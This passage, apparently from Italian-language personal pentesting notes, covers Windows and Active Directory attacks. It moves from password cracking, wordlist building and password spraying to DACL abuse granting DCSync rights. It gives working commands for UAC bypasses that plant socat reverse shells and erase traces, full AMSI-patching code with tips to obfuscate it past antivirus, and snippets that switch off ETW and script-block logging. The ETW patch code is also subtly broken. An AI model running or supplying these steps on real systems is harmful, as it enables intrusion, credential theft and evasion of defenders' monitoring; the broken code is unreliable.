5) Attacco con le regole:

_L'attacco con le regole è uno dei più avanzati in quanto a seconda del pattern scelto andremo ad applicare delle modifiche alla wordlist iniziale la quale in seguito ci ritornerà un'output diverso_

_Tabella delle funzioni:_

```
l: Converti tutte le lettere in minuscolo.
u: Converti tutte le lettere in maiuscolo.
r: Inverte il testo.
c / C: Capitalizza la prima lettera e converte le altre in minuscolo / converte la prima lettera in minuscolo e le altre in maiuscolo.
{ / }: Ruota la parola a sinistra / destra.
d / q / zN / ZN: Duplica la parola / tutti i caratteri / primo carattere / ultimo carattere / N caratteri dalla parola.
^X / $X: Aggiungi il carattere X all'inizio / alla fine del testo.
t / TN: Cambia il caso di tutta la parola / alla posizione N nella parola (dove la prima posizione è 1).
```

__N.B: La lista completa è disponibile [qui](https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions)__

_Comandi:_

```bash
echo '<set regole>' > rule.txt #comando per creare le regole e salvare in un txt
```
```bash
hashcat -a 0 -m <num hash> <nome file hash> <wordlist password> -r <file regole> #comando per avviare l'attacco con le regole
```
```bash
hashcat -a 0 -m <num hash> -g <numero regole casuali> <nome file hash> <path file wordlist> #comando per applicare regole randomiche
```
```bash
ls -l /usr/share/hashcat/rules/ #comando per listare le regole di default per hashcat
```

_Link a risorse:_

_Link per recuperare altre regole da utilizzare con hashcat_

[NSA-Rules](https://github.com/NSAKEY/nsa-rules)

[Corporate.rule](https://github.com/sparcflow/HackLikeALegend/blob/master/old/chap3/corporate.rule)

6) Cracking Wifi:

_Hashcat permette di craccare anche le password delle wifi_

__N.B: l'attacco richieda che venga catturato l'handshake in un packet capture__

_Comandi cracking MIC (Message Integrity Check):_

_Il pcap catturato va convertito in un formato leggibile da Hashcat o utilizziamo il seguente [sito](https://hashcat.net/cap2hashcat) o scarichiamo il tool_

```bash
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
make #comandi per installare la util
```
```bash
./cap2hccapx.bin <file pacchetti catturati>.cap  <file per hashcat>.hccapx #comando per convertirlo in formato hccapx
```
```bash
hashcat -a 0 -m 22000 <file>.hccapx <file wordlist> #comando per craccare la password con attacco a forza bruta
```

_Comandi cracking PMKID (Pairwise Master Key Identifier)_

_Questa metodologia richiede che venga sempre catturata la PMKID in un packet capture e poi convertito in un formato comprensibile ad hashcat_

```bash
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
make && make install #comandi per insttalre in tool hcxpcapngtool
```
```bash
hcxpcapngtool <file pacchetti catturati>.cap -o <file per hashcat> #comandi per convertire il .cap
```
```bash
hashcat -a 0 -m 22000 <file>.hccapx <file wordlist> #comando per craccare la password con attacco a forza bruta
```

##### Creazione di wordlists:

_Il saper creare le wordlists è molto importante questa sezione oltre a focalizzarsi in wordlists di password ci sarannò scritti anche tool/script per generare liste di usernames_

- __Crunch:__

_[Crunch](https://github.com/shadwork/Windows-Crunch/releases) permette di generare delle password definendo lunghezza minima, massima e pattern da applicare_

_Comandi:_

```bash
crunch <lunghezza minima> <lunghezza massima> <pattern % indica numeri @ indica lettere> -o <nome file output> #comando completo per generare una wordlist con crunch
```

- __Cupp:__

_[Cupp](https://github.com/Mebus/cupp) altro tool per generare una wordlist ma permette di farlo in maniera più precisa su un determinato utente, in quanto lo stesso tool chiederà domande specifiche dello user target al fine di creare una lista più completa possibile_

_Comandi:_

```bash
cupp -i #comando per startare cupp, andrà data una risposta alle sue domande per generare la wordlist
```

- __Kwprocessor:__

_[Kwprocessor](https://github.com/hashcat/kwprocessor), il seguente tool genera delle wordlists seguendo l'idea di __"camminare sulla tastiera"__, cioè un'utente che per creare una sua password abbia semplicemente premuto tasti a caso su di essa_

_Comandi:_

```bash
git clone https://github.com/hashcat/kwprocessor
cd kwprocessor
make #comandi per installare e settare il tool
```
```bash
/kwp -s <numeri shift> basechars/<base di caratteri da utilizzare> keymaps/<layout tastiera>  routes/<pattern da seguire> #comando per settare Kwprocessor
```

__N.B: Maggiori Info andare [qui](https://github.com/hashcat/kwprocessor#routes)__

- __PrinceProcessor:__

_Il tool [PrinceProcessor](https://github.com/hashcat/princeprocessor) genera una wordlist combinata cioè gli viene passata una lista di password singole e il tool le combina insieme_

_Comandi:_

```bash
wget https://github.com/hashcat/princeprocessor/releases/download/v0.22/princeprocessor-0.22.7z
7z x princeprocessor-0.22.7z
cd princeprocessor-0.22
./pp64.bin -h #comandi per installare il tool
```

```bash
./pp64.bin --pw-min=<num minimo lunghezza> --pw-max=<numero massimo lunghezza> -o <nome file output> <wordlist input> #comando per generare la wordlist
```

- __Namemash:__

_script in python che genera una lista di usernames utilizzando nome e cognome, è scaricabile [qui](https://gist.github.com/superkojiman/11076951)_

_Comandi:_
```bash
namemash.py <nome file>.txt >> <nome file dove salvare>.txt #comando per utilizzare Namemash
```

- __Cewl:__

_Il tool [Cewl](https://github.com/digininja/CeWL) genera le wordlist facendo il crawling di un sito web target e leggendo delle parole chiavi, quest'ultime verranno inserite nella wordlist_

_Comandi:_

```bash
cewl -d <profondità di spidering> -m <lunghezza minima wordlist> -w <file output> <Url sito target> #comando per avviare il tool
```

### CrackMapExec:

_Tool molto utile nel pentesting di AD è CrackMapExec è utilizzato con i protocolli (smb, winrm, ldap, mssql e ssh) e da il suo meglio con i suoi comandi per enumerare e capire meglio il target_

- _Comandi installazione:_

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install crackmapexec #comandi per installare crackmapexec
```
_Comandi:_
```smb
crackmapexec smb <ip> -u <'nome utente' | users list> -p <'password' | passwords file> --continue-on-success #comando che valida gli username e password facendo uno spraying
```
```bash
crackmapexec smb <nome dominio> -u '<nome utente>' -p '<password>' --rid-brute #comando che lista gli utenti tramite rid-brute
```
```bash
crackmapexec smb <nome dominio> -u '<nome utente>' -p '<password>' ---shares #comando che lista tutti gli shares e i relativi permessi
```
```bash
crackmapexec smb <nome dominio> -u '<nome utente>' -p '<password>' --pass-pol #comando per listare le politiche delle password all'interno del dominio
```
```bash
crackmapexec smb <nome dominio> -u '<nome utente>' -p '<password>' --loggedon-users #comando per listare gli utenti che sono loggati
```
__N.B: nei comandi di esempio la flag password può essere omessa se è possibile il login senza di essa__

### DACL attacks:
_viene riportata una piccola lista/metodologia di attacchi alla discretionary access list, piccola perchè sono molteplici le ACE che possono essere sfruttate:_

- __Enumerazione:__

_Prima di poter sfruttare le ACE vulnerabili vanno trovate tramite la fase di enumerazione che può essere manuale o automaticaa tramite dei tools_

1) _Comandi Powershell:_
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > <nome file output>.txt #comando che genera la lista di user presenti nel sistema
```
```powershell
foreach($linea in [System.IO.File]::ReadLines("<path file lista utenti>")) {get-acl  "AD:\$(Get-ADUser $linea)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<dominio>\\<nome utente target>'}} #comando che tramite loop legge gli utenti nella lista per poi andare a recuperare le loro ACL ed infine controllare se la voce "IdentityReference" combaci con l'utente target
```
_Dal comando sopra avremmo ottenuto alla voce __"ObjectType"__ il guid dell'ACE e che se cercato al volo su internet potrà essere collegato a quale entrie sfruttare_

__N.B: l'enumerazione manuale è sicuramente più stealth di un tool automatico ma la sua efficacia nella ricerca è molto limitata__

2) _Powerview:_

_Il tool [Powerview](./#powerview) permette di enumerare le ACE in maniera automatica:_

_Comandi:_
```powershell
Find-InterestingDomainAcl #comando powerview per enumerare automaticamente le ACE più interessanti
```
_abbiamo la possibilità di farlo anche in un metodo più manuale ma più accurato nella ricerca_
```powershell
$sid = Convert-NameToSid <nome oggetto> #comando per convertire il nome oggetto (nomi utenti gruppi) in sid
```
```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity <nome target> | ? {$_.SecurityIdentifier -eq $sid} #comando che recupera tutte le ACE e che ci mostra quelle dell'utente target
```
_Una volta eseguito il comando sono 2 le voci da tenere d'occhio la prima __"ObjectDN"__ che indica l'oggetto target e la seconda __"ObjectAceType"__ che specifica il tipo di ace a nostra disposizione_

3) _Bloodhund:_

_[Bloodhund](./#bloodhund) offre la possibilità nella sezione __"node info"__ di poter visionare le ACE sfruttabili ed addirittura in che manoiera andando nella sezione __"Help"__ presente quando si tocca la linea che collega i nodi nel grafico_

##### AddMember:
_AddMember viene utilizzato per aggiungere membri ad un gruppo e può essere utilizzato per un [Privilege escalation](./#privilege-escalation) più complesso_

_Comandi:_
```powershell
Add-ADGroupMember "<nome gruppo>" -Members "<nome utente>" #comando per aggiungere ad un gruppo il membro specificato
```
```powershell
Get-ADGroupMember -Identity "<nome gruppo>" #comando per vedere i membri al gruppo
```
##### WriteDACL
_Viene sfruttata il privilegio di poter editare la DACL, crei un user, lo aggiungiamo ai gruppi __"Remote Management Users"__ per controllare l'utente a distanza, al gruppo
__"Exchange Windows Permissions"__ gruppo dell'Active Directory che permette di modificare i permessi di dominio, infine importiamo powerView e tramite il comando __"Add-DomainObjectAcl"__ con __"-rights"__ DCSync potremmo dumpare tutti gli hash di dominio con secretsdump._
```powershell
New-LocalUser <nome_account> -Password (echo "<password>" | convertTo-SecureString -AsPlainText -force) -FullName "<nome_completo>" -Description "<descrizione>"
```
```powershell
Add-localGroupMember -Group "Remote Management Users" -member tester4
```
```powershell
Add-localGroupMember -Group "Exchange Windows Permissions" -Member <nome_utente>
```
_Questo comando aggiunge un ACL oggetto all'ACL list per un utente a dominio con diritti DSync che permettono di dumpare tutti gli hash a dominio:_
```powershell
Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose
```
##### ForceChangePassword:
_ACE che ci permette di modificare la password dell'user corrente senza la necessità di dover conoscere la password vecchia_

_Comandi:_
```powershell
$Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
```
##### GenericAll:
_ACE che ci permette il controllo totale sull'oggetto, possiamo cambiare password, aggiungere SPN ecc..._

_Comandi:_
```powershell
Add-ADGroupMember -Identity "<nome gruppo>" -Members <nome membro> #comando per aggiungere utente ad un gruppo 
$Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
```
##### WriteOwner:

_ACE che permette di poter cambiare l'owner di un oggetto_

_Comandi:_
```powershell
Set-DomainObjectOwner -Identity <SID gruppo> -OwnerIdentity "<nome utente>" -Verbose #comando per cambiare proprietario
```
##### GenericWrite:

_ACE che permette di modificare campi non sicuri di un oggetto tipo il parametro ScriptPath_

### Bypass

##### Bypass UAC

__Per sapere cos'è l'UAC e come funziona andare [qui](./#uac)__

_Nella seguente sezione vengono allegati dei casi di compromissione per far capire meglio la logica dietro al bypass e come funziona l'UAC_

- __Caso di compromissione GUI:__

1) msconfig.exe: 

_cliccando tasto windows+R, scrivendo e aprendo msconfig e infine aprendo __processhacker__ potremmo notare che msconfig runna con un high token, grazie alla sua autoelevation apre direttamente il programma con i più alti privilegi e se andiamo nella sezione __tools__ del programma, cerchiamo command prompt potremmo ottenere una shell con permessi elevati._

2) azman.msc __(vecchia utility winserver 2003 utilizzata per gestire i permessi)__:

_aprendo esegui, avviando azman.msc anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __"help o ?"__ cliccando su guida e poi continuando con un click destro e selezionando __"HTML o source code"__ potremmo notare che si aprir# notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._ 

3) mmc.exe:

_Funziona anche con mmc.exe anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __"help o ?"__ cliccando su guida e poi continuando con un click destro e selezionando __"HTML o source code"__ potremmo notare che si aprir# notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._

- __Caso di compromissione AutoElevation:__

1) fodhelper __(executable di windows per le lingue)__:

_Avviando possiamo notare che avrà un IL high, usando procmon.exe possiamo osservare che il sistema operativo va a ricercare quale software utilizzare per aprire fodhelper questo perchè nei sistemi operativi Windows esiste il ProgID cioè ad un'estensione è associata un programma di default ed è specificato in genere all'interno della chiave HKEY_CLASSES_ROOT che è un'insieme delle chiavi (HKCU e HKEY).
Nell'exploit possiamo notare che nella HKCU, più precisamente nella subykey con questo path __"shell/open/command"__ è dove viene anche specificato il ProgID possiamo bypassare la system wide association(data un estensione tipo .txt, utilizziamo programma/i di default) andando ad inserire una revshell nella subkey, cosi facendo otteremo una shell privilegiata perchè lo stesso programma è avviato con IL high:_

__N.B: è importante almeno essere nel gruppo amministratori per poter editare i registri.__

Comandi:
```powershell
net user <nome utente> | find "Local Group" #comando per vedere il gruppo di appartenenza 
```
```powershell
whoami /groups | find "Label" #comando per capire il proprio IL
```
```powershell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command #settare una variabile d'ambiente con il path specificato 
```
```powershell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<porta> EXEC:cmd.exe,pipes" #comando che crea una variabile d'ambiente che crea al suo interno un socat per la revshell
```
```powershell
reg add %REG_KEY% /v "DelegateExecute" /d "" /f #viene aggiunta la chiave di registro.
/v #specifica il nome 
/d #i dati all'interno
/f #force per evitare ogni prompt di conferma
```
```powershell
reg add %REG_KEY% /d %CMD% /f #comando per inserire la revshell
```
```powershell
nc -lnvp <port> #comando per aprire listener sulla nostra macchine
```
```powershell
fodhelper.exe #comando per avviare l'eseguibile
```
```powershell
reg delete HKCU\Software\Classes\ms-settings\ /f #comando per eliminare e quindi pulire le tracce
```
_Dopo aver fatto tutti i comandi ed infine avviato l'eseguibile e se avremmo anche aperto un listener dovremmo ottenere la revshell con un IL high._

2) fodhelper con AV attivo:

_abbiamo l'AV attivo bene per bypassare l'antivirus viene messa appunto una strategia efficare tramite l'utilizzo di Curver entry(Curver entry è utilizzato quando si hanno più istanze di uno stesso software ma di diverse versioni, curver permette a Windows di utilizzare la versione di default)._

```powershell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes" #comando per la revshell
```
```powershell
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f #creiamo la subkey .thm con all'interno la revshell
```
```powershell
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f #creiamo la subkey curver che punta alla subkey .thm contenente la revshell
```
```powershell
nc -lnvp <port> #creiamo il listener
```
```powershell
fodhelper.exe #startiamo l'eseguibile
```
Abbiamo ottenuto la revshell con IL high anche se attivo l'antivirus

Possono sorgere dei problemi se nelle UAC settings è attiva l'opzione Always Notify perchè ogni modifica deve essere autorizzata esempio l'exploit di fodhelper
però c'è ancora un modo per bypassare UAC è tramite gli scheduler task, che sono avviati da utenti normali ma eseguiti con privilegi d' amministratore e il tampering di variabili d'ambiente.


- __Bypass tramite scheduler:__

1) DiskCleanup:

_Andando a visionare lo scheduler task e cercano il DiskCleanup possiamo notare che ogni utente può utilizzarlo e verrà eseguito con privilegi di amministratore
N.B (la voce __"Run with highest privileges"__  eredita IL da chi lo avvia quindi da un'utente non-admin avrà IL medium).
Andando poi nella sezione __"Actions"__ possiamo notare che runna il programma tramite comando CMD e fin qui tutto normale, tranne per le variabili d'ambiente che possono essere modificate a nostro vantaggio._

Comandi:
```cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes &REM" /f
#crea una subkey con nome windir che simula la variabile d'ambiente %windir% e che poi ha al suo interno una revshell il $REM serve a commentare il resto
```
```bash
nc -lnvp <port> #comando per il listener
```
```cmd
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I #avvia il task con la revshell 
```
```cmd
reg delete "HKCU\Environment" /v "windir" /f #comando per eliminare la subkey creata in precendenza
```

- __Comandi Generali:__
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA #comando per sapere se attivo UAC
```
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin #comando per sapere il livello di UAC
```
```powershell
[environment]::OSVersion.Version #comando per capire la build di windows
```
_Il comando per capire la build è importante, in quanto molte di esse sono affette da un UAC bypass, dopo aver visionata la build va visionata [questa pagina](https://en.wikipedia.org/wiki/Windows_10_version_history)(Cross-Reference di windows 10 ma esiste anche di windows 11) per capire la release, dopo aver visionato la release consiglio questa [repo](https://github.com/hfiref0x/UACME)(cliccare la voce "keys") che contiene molti bypass da poter utilizzare_

##### Bypass AMSI:

_Lascio qui il [link](./#amsi) dove viene spiegato cos'è l'AMSI_

- __Powershell Downgrade:__

_Il powershell downgrade consiste nel passare a una versione meno recente di powershell per evitare quelle features di sicurezza introdotte nella versioni più recenti._

__N.B: Le feature sono state introdotte nella versione 5.0 di powershell__

_Comandi:_
```powershell
powershell -Version <numero versione> #comando per cambiare versione
```

_Questo tipo di bypass funziona se presente l'engine delle versione meno recenti di powershell, è inoltre possibile utilizzare il tool [Unicorn](https://github.com/trustedsec/unicorn) per automatizzare il tutto_

- __Powershell riflesso:__

_Consiste nell'utilizzare lo stesso powershell per disattivare l'AMSI_

_Comandi:_
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') #linea di codice che recupererà il tipo di assembly utilizzato dalla shell corrente, [Ref] indica di passare un valore ad un'altra funzione
```
```powershell
.GetField('amsiInitFailed','NonPublic,Static') #linea di codice che recupererà il campo amsiInitFailed e lo setta statico e non pubblico
```
```powershell
.SetValue($null,$true) #linea che setta il campo amsiInitfailed a true
```
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) #linea di codice     
completa
```
_Patching:_

_Analizzando il codice è possibile sovrascrivere la zona di memoria della funzione __"AmsiScanBuffer"__, in modo che analizzi quello che vogliamo_

_Codice:_
```powershell
[DllImport(`"kernel32`")] 
public static extern IntPtr GetProcAddress( 
IntPtr hModule, #handle della DLL
string procName #nome della variabile o funzione
); 

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
string lpModuleName #modulo per ottenere l'handl
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
IntPtr lpAddress, #indirizzo regione
UIntPtr dwSize,   #grandezza
uint flNewProtect, #opzioni protezione
out uint lpflOldProtect  #puntatore alle vecchio protezioni
); #definizione dell'API Kernel32 con i relativi metodi

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #comando per caricare le API call

$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); #array di byte spazzatura da scrivere

$handle = [Win32.Kernel32]::GetModuleHandle(
	 'amsi.dll' #definzione da dove prendere l'handle
);

[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
      $handle,  #varibile handle di amsi.dll
     'AmsiScanBuffer'  #API call da prendere
); 

[UInt32]$Size = 0x5; #variabile che stora la grandezza
[UInt32]$ProtectFlag = 0x40; #read and write page
[UInt32]$OldProtectFlag = 0; 
[Win32.Kernel32]::VirtualProtect(
  $BufferAddress, #puntatore alla funzione AmsiScaneBuffer 
  $Size, #grandezza
  $ProtectFlag, #attivazione read and write
  [Ref]$OldProtectFlag
); 

[system.runtime.interopservices.marshal]::copy(
  $buf, #byte da scrivere
  0, #da dove iniziare a scrivere
  $BufferAddress, #indirizzo di memoria da dove scrivere
  6 #numeri elementi da scrivere
); 
```
__N.B: non è scontato da sottolineare che questo snippet di codice è già segnato da molti antivirus e EDR, per utilizzarlo si può considerare di obfuscarlo o encodarlo__

- __Tool e repository:__

_Esistono come al solito dei tool per automatizzare il processo quali:_

- [Amsi.fail](http://amsi.fail/)

- [AMSITrigger](https://github.com/RythmStick/AMSITrigger)

##### Bypass Applocker:

_Applocker è un'applicazione di windows (vers. Enterprise) che permette di controllare quali programmi possono essere avviati da remoto o dal proprio pc da determinati utenti, e lo fa tramite delle regole specifiche_

_Comandi:_
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections #comando per listare le policy di applocker
```
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone #comando per testare una policy di applocker su un determinato eseguibile
```
- __Cartelle in Whitelist:__

_Vi è la possibilità che alcune cartelle non siano in blacklist, quindi basterà semplicemente copiare o spostare l'eseguibile in codeste posizioni_

ES: `C:\Windows\System32\spool\drivers\color`

##### Bypass Constrained Language Mode:

_Il Constrained Language Mode è un'opzione di sicurezza utilizzata per bloccare le totalemente o alcune funzionalità di powershell, questà modalità può avere 4 valori:_

1) Fulllanguage = modalità standard di powershell che permette l'utilizzo completo di esso

2) ConstrainedLanguage = modalità che limita le funzionalità più avanzate di powershell

3) RestrictedLanguage = modalità che limita le funzionalità avanzate e di base per powershell

4) NoLanguage = modalità che blocca l'utilizzo di powershell

_Comandi:_

```powershell
$ExecutionContext.SessionState.LanguageMode #comando per ottenere l'impostazione del constrained language mode
```
```powershell
$ExecutionContext.SessionState.LanguageMode = "<valore>" #comando per cambiarne il valore
```

- __.hta:__

_Una metodologia di bypass sono i file .hta (HTML Application), questo tipo di estensione permette l'utilizzo di altri linguaggi tipo vbscript e può essere utilizzato per ottenere una shell anche se non possiamo utlizzare powershell_

_Funzionamento:_

_Creiamo un nuovo file di testo ed incolliamo il seguente codice:_

```vbscript
<script LANGUAGE="VBScript">
Set cmd = CreateObject("WScript.Shell") 
cmd.run("<comando da eseguire>")
</script> #script che permette di eseguire comandi
```
_Cambiamo il nome dell'estensione .hta e apriamo il file con __"Host Applicazioni HTMl Microsoft (R)"___

##### Bypass Logging:

_Quando dobbiamo bypassare un sistema di logging in windows bisogna tenere conto di __"ETW (Event Tracing for Windows)"__, una tecnologia di tracciamento che raccoglie gli eventi_

__N.B: per sapere come funzionano i Log in windows andare [qui](./#log)__

- _Funzionamento ETW:_

_Il sistema ETW è composto da 3 componenti:_

1) Controllers = costruiscono e gestiscono le sessioni cioè sono quelli che decidono come e dove i dati devono andare

2) Consumers = interpretano gli eventi, visiona ogni sessione e cataloga gli eventi

3) Providers = forniscono gli eventi, a seconda del loro provider

_I providers si dividono in 4 tipologie:_ 

I) MOF (Managed Object Format) = definisce gli eventi dalle classi MOF e più in generale il MOF definisce pure la struttura degli oggetti gestiti in windows

II) WPP (Windows Software Trace Preprocessor) = strumento di diagnostica che insieme a TMF (Trace Message Format) permette di generare e formattare per bene tracce di debug

III) Manifest-Based = definisce gli eventi dai manifest delle applicazioni

IV) TraceLogging = API di ETW che permette di registrare degli eventi

_Ricapitolando il funziomento generale:_

`/Providers/ ---eventi---> |sessione 1, sessione 2 ecc... gestite dal /controller/ -------> /Consumers/`

_Ora che conosciamo le 3 componenti, vi sono dei metodi per bypassarli_

- __Providers:__

1) _Modifica del PSEtwLogProvider:_

_Gli ETW provider sono caricati in sessione dall'assembler .NET di nome __"PSEtwLogProvider"__, visto che l'assembler ha lo stesso livello di privilegio della sessione possiamo modificarlo tramite powershell riflesso (esempio quasi analogo nel bypass dell'AMSI che trovi [qui](./#bypass-amsi))_

_Comandi:_
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider') #pezzo di codice per ottenere l'assembler
```
```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null) #pezzo di codice per ottenere un $null valore dal field etwprovider
```
```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0); #passo per settare m_enabled $null
```
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider') 
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null) 
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
#codice completo che disattiva il provider
```
```powershell
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count #comando che runnato prima dello script darà un 
numero ma una volta runnato il codice completo il count cioè l'eventi si fermerà ad uno stesso numero perchè il provider sarà bloccato
```
2) _GPO (Group Policy Object):_

_ETW ha diverse features che coprono diverse tipologie di logging ma non tutte sono attive, per attivarle o disattivarle bisogna andare nelle GPO (Group policy object) che fa parte del group policy management; abbiamo la possibilità di modificarle perchè gli assembler sono caricati nella stessa sessione dell'utente, quindi un user normale ha gli stessi privilegi e tramite del powershell riflesso puà apportare modifiche_

_Codice:_
```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
#variabile che recupera il campo cachedGroupPolicySettings
```
```powershell
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null) #varibile che recupera un valore nullo
```
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 #riga di codice che disabilità l'EventID num 4103
```
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 #riga di codice che disabilita l'EventID num 4104
```
```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 r
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 #codice completo
```
```powershell
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count #comando che runnato prima dello script darà un 
numero ma una volta runnato il codice completo il count cioè l'eventi si fermerà ad uno stesso numero perchè il provider sarà bloccato
```
3) _Log Pipeline:_

_Log pipeline consiste nel disattivare la voce __"LogPipelineExecutionDetails"__ che se settato a __"$false"__ non creerà più log dei comandi_

_Comandi:_
```powershell
$module = Get-Module Microsoft.PowerShell.Utility #comando per prendere il modulo target
$module.LogPipelineExecutionDetails = $false #comando per disattivare il logpipeline
```
```powershell     
$snap = Get-PSSnapin Microsoft.PowerShell.Core #comando che prende il powershell snap-in target
$snap.LogPipelineExecutionDetails = $false #ìcomando per disattivare il logpipeline
```
- __Controller:__

1) _Patching di EtwEventWrite:_

_Il patching di EtwEventWrite consiste nel modificare il suo return point e inserire un nostro codice_

_Codice:_

      var ntdll = Win32.LoadLibrary("ntdll.dll"); #DLL che svolge operazioni a basso livello in questo caso la funzione etwevenwrite e all'interno della dll
      var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite"); #riga di codice che recupera l'handle

      uint oldProtect; #intero che stora il valore esadecimale dei vecchi diritti cioè R (Read), W (Write) o X (Execute)
      Win32.VirtualProtect(
	 etwFunction,  #variabile con l'indirizzo alla funzione EtwEventWrite
	 (UIntPtr)patch.Length, #lunghezza della regione di memoria che si desidera modificare
	 0x40, #cambio dei permessi in Read e Write
	 out oldProtect #vecchi permessi in caso debbano essere ripristinati
      );
      
      patch(new byte[] { 0xc2, 0x14, 0x00 }); #creazione di un array di byte con 3 valori
      Marshal.Copy( #metodo marshal copy che copia l'array in un indirizzo di memoria
	 patch, #array da copiare
	 0, #num indice iniziale dell'array di byte
	 etwEventSend, #indirizzo dove copiare i dati 
	 patch.Length #lunghezza dei dati da copiare
     );

     VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect); #funzione che ripristina i vecchi permessi
     
     Win32.FlushInstructionCache( #funzione che garantisce che le modifiche alla memoria siano applicate
	 etwFunction,
	 NULL #dimensione da pulire
     );

## CVE:

_Nella sezione CVE non è umanamente possibile scriverle tutte ma ne verrannò presentate e spiegate alcune per imparare ulteriori nozioni e componenti che fanno parte dell'Active Directory._

### CVE-2021-1675/CVE-2021-34527 (PrintNightmare):

_Le due CVE ricadono nella vulnerabilità chiamata __"Windows Print Spooler Remote Code Execution Vulnerability"__, ed entrambe utilizzano il __"Print Spooler"__ però differiscono, la __"CVE-2021-1675"__ richiede di avere accesso fisico o locale alla macchina per poter utilizzare la DLL malevola mentre la __"CVE-2021-34527"__ può iniettare la DLL malevola da remoto_

__N.B: Possono anche essere utilizzate per un local privilege escalation__

_POC:_

- [CVE-2021-1675/CVE-2021-34527](https://github.com/cube0x0/CVE-2021-1675), link alla POC

- [CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675), link ad un'altra POC per il local privilege esclation

### CVE-2022-26923: (Vulnerabilità sui certificati dell'AD)

_La vulnerabilità sfrutta la misconfigurazione dei certificati nell'AD e la possibilità che un utente può aggiungere fino a 10 macchine al gruppo machine dell'active directory; esitono 2 template quello User e quello machine, lo User non è sfruttabile in quanto non possiamo modificare i parametri del __UPN__ (User Principal Name) che si trova dentro al __SAN__ (Subjec ALternative Name) invece nel template machine, dopo aver aggiunto un nuova macchina al gruppo dei computer possiamo generare un certificato in cui cambiamo il DNS hostname con quello del domain controller e ottenere NTLM Hash._
 
_Comandi:_
```cmd
. ./Certify.exe find /vulnerable #comando per verificare se vulnerabile
```
```bash
sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_certificato> -ca       
<dominio_certificate_autority> #comando per generare un certificato se selezionamo il template machine, al computer aggiunto va scritto un $ alla fine del nome
```
```bash
certipy-ad auth -pfx <file configurazione>.pfx #comando che fa la convalida del certificato interrogando il kerberos e prova a recuperare NTLM hash dell'account con impacket
```

